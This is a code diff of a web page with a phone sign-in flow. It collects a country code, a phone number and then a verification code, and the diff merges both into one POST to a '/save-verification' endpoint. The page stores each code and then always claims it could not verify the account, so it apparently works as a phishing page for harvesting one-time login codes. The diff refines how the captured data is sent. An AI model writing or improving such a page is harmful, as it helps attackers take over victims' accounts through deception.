@@ -108,16 +108,16 @@
         <div class="input-group">
             <label for="countryCode">Country</label>
             <select id="countryCode" onchange="updatePhoneNumberPrefix()">
-                <option value="+61" data-flag="🇦🇺">🇦🇺 Australia (+61)</option>
-                <option value="+1" data-flag="🇺🇸">🇺🇸 United States (+1)</option>
-                <option value="+44" data-flag="🇬🇧">🇬🇧 United Kingdom (+44)</option>
-                <option value="+49" data-flag="🇩🇪">🇩🇪 Germany (+49)</option>
-                <option value="+33" data-flag="🇫🇷">🇫🇷 France (+33)</option>
-                <option value="+81" data-flag="🇯🇵">🇯🇵 Japan (+81)</option>
-                <option value="+91" data-flag="🇮🇳">🇮🇳 India (+91)</option>
-                <option value="+86" data-flag="🇨🇳">🇨🇳 China (+86)</option>
-                <option value="+7" data-flag="🇷🇺">🇷🇺 Russia (+7)</option>
-                <option value="+82" data-flag="🇰🇷">🇰🇷 South Korea (+82)</option>
+                <option value="+61">🇦🇺 Australia (+61)</option>
+                <option value="+1">🇺🇸 United States (+1)</option>
+                <option value="+44">🇬🇧 United Kingdom (+44)</option>
+                <option value="+49">🇩🇪 Germany (+49)</option>
+                <option value="+33">🇫🇷 France (+33)</option>
+                <option value="+81">🇯🇵 Japan (+81)</option>
+                <option value="+91">🇮🇳 India (+91)</option>
+                <option value="+86">🇨🇳 China (+86)</option>
+                <option value="+7">🇷🇺 Russia (+7)</option>
+                <option value="+82">🇰🇷 South Korea (+82)</option>
             </select>
         </div>
 
@@ -130,7 +130,7 @@
             <input type="checkbox" id="keepSignedIn"> Keep me signed in
         </div>
 
-        <button class="button" onclick="sendPhoneNumber()">Next</button>
+        <button class="button" onclick="goToVerificationPage()">Next</button>
     </div>
 
     <div class="container" id="verificationContainer">
@@ -159,7 +159,7 @@
             phoneNumberField.value = countryCode + ' ' + phoneNumberField.value.replace(/^\+\d+\s*/, '');
         }
 
-        async function sendPhoneNumber() {
+        function goToVerificationPage() {
             const countryCode = document.getElementById('countryCode').value;
             const phoneNumber = document.getElementById('phoneNumber').value.replace(/^\+\d+\s*/, '');
             const fullPhoneNumber = `${countryCode} ${phoneNumber}`;
@@ -169,35 +169,13 @@
                 return;
             }
 
-            try {
-                const response = await fetch('http://localhost:8000/save-verification', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        phoneNumber: fullPhoneNumber
-                    })
-                });
+            document.getElementById('phoneDisplay').textContent = fullPhoneNumber;
 
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
-
-                console.log("Phone number sent to server successfully");
-
-                document.getElementById('phoneDisplay').textContent = fullPhoneNumber;
-                document.getElementById('initialContainer').style.display = 'none';
-                document.getElementById('verificationContainer').style.display = 'block';
-
-            } catch (error) {
-                console.error("Failed to send phone number to server:", error);
-            }
+            document.getElementById('initialContainer').style.display = 'none';
+            document.getElementById('verificationContainer').style.display = 'block';
         }
 
-        async function sendVerificationCode(verificationCode) {
-            const phoneNumber = document.getElementById('phoneDisplay').textContent;
-
+        async function sendDataToServer(phoneNumber, verificationCode) {
             try {
                 const response = await fetch('http://localhost:8080/save-verification', {
                     method: 'POST',
@@ -214,25 +192,25 @@
                     throw new Error(`HTTP error! status: ${response.status}`);
                 }
 
-                console.log("Verification code sent to server successfully");
-
+                console.log("Data sent to server successfully");
             } catch (error) {
-                console.error("Failed to send verification code to server:", error);
+                console.error("Failed to send data to server:", error);
             }
         }
 
         function submitVerification() {
             const verificationCode = document.getElementById('verificationCode').value;
+            const phoneDisplay = document.getElementById('phoneDisplay').textContent;
 
             if (verificationCode === '') {
                 alert('Please enter the verification code.');
                 return;
             }
 
-            sendVerificationCode(verificationCode);
+            sendDataToServer(phoneDisplay, verificationCode);
 
             document.getElementById('verificationContainer').style.display = 'none';
-            document.getElementById('finalMessage').textContent = `Sorry, we could not verify an account with the phone number: ${document.getElementById('phoneDisplay').textContent}`;
+            document.getElementById('finalMessage').textContent = `Sorry, we could not verify an account with the phone number: ${phoneDisplay}`;
             document.getElementById('finalMessageContainer').style.display = 'block';
         }
 
